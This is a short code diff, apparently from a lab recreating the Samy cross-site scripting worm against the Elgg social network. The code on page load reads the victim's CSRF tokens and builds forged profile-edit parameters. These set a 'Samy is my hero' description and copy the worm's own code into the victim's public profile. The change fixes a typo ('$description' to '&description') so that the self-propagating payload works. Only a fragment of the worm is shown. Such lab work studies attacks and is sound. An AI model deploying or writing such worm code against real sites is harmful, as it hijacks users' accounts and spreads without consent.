@@ -15,7 +15,7 @@ window.onload = function () {
     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
     var briefDesc = "&briefdescription=Samy is my hero"+ "&accesslevel[briefdescription]=2";
-    var desc = "$description="+ wormCode + "&accesslevel[description]=2";
+    var desc = "&description="+ wormCode + "&accesslevel[description]=2";
     
     
     
